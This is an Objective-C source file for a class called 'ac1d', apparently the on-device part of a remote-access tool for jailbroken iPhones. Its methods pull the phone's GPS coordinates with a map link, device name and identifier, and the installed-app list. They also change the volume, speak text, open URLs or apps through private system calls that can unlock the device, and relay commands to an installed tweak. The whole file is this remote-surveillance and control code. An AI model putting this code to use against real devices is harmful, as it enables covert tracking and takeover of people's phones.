#import "ac1d.h"

@implementation ac1d

-(id)init {
    _thisUIDevice = [UIDevice currentDevice];
    [_thisUIDevice setBatteryMonitoringEnabled:YES];
    return self;
}

-(void)battery {
    int battery_level = ([_thisUIDevice batteryLevel] * 100);
    printf("Battery Level: %d\n", battery_level);
}

-(void)vibrate {
    AudioServicesPlayAlertSound(kSystemSoundID_Vibrate);
}

-(void)locate {
    CLLocationManager* manager = [[CLLocationManager alloc] init];
    [manager startUpdatingLocation];
    CLLocation *location = [manager location];
    CLLocationCoordinate2D coordinate = [location coordinate];
    NSString *result = [NSString stringWithFormat:@"Latitude: %f\nLongitude: %f\nhttp://maps.google.com/maps?q=%f,%f", coordinate.latitude, coordinate.longitude, coordinate.latitude, coordinate.longitude];
    if ((int)(coordinate.latitude + coordinate.longitude) == 0) {
        result = @"Failed to get coordinates!";
    }
    [manager release];
    printf("%s\n", [result cStringUsingEncoding:NSUTF8StringEncoding]);
}

-(void)say:(NSString *)message {
    AVSpeechUtterance *utterance = [AVSpeechUtterance speechUtteranceWithString:message];
    utterance.rate = 0.4;
    AVSpeechSynthesizer *syn = [[[AVSpeechSynthesizer alloc] init]autorelease];
    [syn speakUtterance:utterance];
}

-(void)getvol {
    [[AVAudioSession sharedInstance] setActive:YES error:nil];
    [[AVAudioSession sharedInstance] addObserver:self forKeyPath:@"outputVolume" options:NSKeyValueObservingOptionNew context:nil];
    NSString *result = [NSString stringWithFormat:@"%.2f",[AVAudioSession sharedInstance].outputVolume];
    printf("Volume Level: %s\n", [result cStringUsingEncoding:NSUTF8StringEncoding]);
}

-(void)setvol:(NSString *)level {
    MPVolumeView* volumeView = [[MPVolumeView alloc] init];
    UISlider* volumeViewSlider = nil;
    for (UIView *view in [volumeView subviews]){
        if ([view.class.description isEqualToString:@"MPVolumeSlider"]){
            volumeViewSlider = (UISlider*)view;
            break;
        }
    }
    [volumeViewSlider setValue:[level floatValue] animated:YES];
    [volumeViewSlider sendActionsForControlEvents:UIControlEventTouchUpInside];
}

-(void)openurl:(NSString *)url {
    if (![url isEqualToString:@""]) {
        CFURLRef cu = CFURLCreateWithBytes(NULL, (UInt8*)[url UTF8String], strlen([url UTF8String]), kCFStringEncodingUTF8, NULL);
        if (!cu) printf("Invalid URL!\n");
        else {
            bool ret = SBSOpenSensitiveURLAndUnlock(cu, 1);
            if (!ret) {
                printf("Failed to open URL!\n");
            }
        }
    }
}

-(void)openapp:(NSString *)application {
    CFStringRef identifier = CFStringCreateWithCString(kCFAllocatorDefault, [application UTF8String], kCFStringEncodingUTF8);
    assert(identifier != NULL);
    int ret = SBSLaunchApplicationWithIdentifier(identifier, FALSE);
    if (ret != 0) {
        printf("Failed to open application!\n");
    }
    CFRelease(identifier);
}

-(void)applications {
    NSString *result = @"";
    char buf[1024];
    CFArrayRef ary = SBSCopyApplicationDisplayIdentifiers(false, false);
    CFIndex i;
    for (i = 0; i < CFArrayGetCount(ary); i++) {
        CFStringGetCString(CFArrayGetValueAtIndex(ary, i), buf, sizeof(buf), kCFStringEncodingUTF8);
        result = [NSString stringWithFormat:@"%@%s\n", result, buf];
    }
    printf("%s", [result cStringUsingEncoding:NSUTF8StringEncoding]);
}

-(void)sysinfo {
    UIDevice *device = [UIDevice currentDevice];
    int batinfo = ([_thisUIDevice batteryLevel]*100);
    NSString *info = [NSString stringWithFormat:@"%@ %d %@ %@ %@ %@\n", [device model], batinfo, [device systemName], [device systemVersion], [device name], [[device identifierForVendor] UUIDString]];
    printf("%s\n", [info cStringUsingEncoding:NSUTF8StringEncoding]);
}

-(void)send_command:(NSString *)command {
    NSDictionary *userInfo = [NSDictionary dictionaryWithObject:command forKey:@"cmd"];
    if ([_messagingCenter sendMessageName:@"commandWithNoReply" userInfo:userInfo] == false) {
        printf("You do not have ac1d installed!\n");
    }
}

-(void)send_reply_command:(NSString *)command {
    NSDictionary *userInfo = [NSDictionary dictionaryWithObject:command forKey:@"cmd"];
    NSDictionary *reply = [_messagingCenter sendMessageAndReceiveReplyName:@"commandWithReply" userInfo:userInfo];
    NSString *replystr = [reply objectForKey:@"returnStatus"];
    printf("%s\n", [replystr cStringUsingEncoding:NSUTF8StringEncoding]);
}

@end
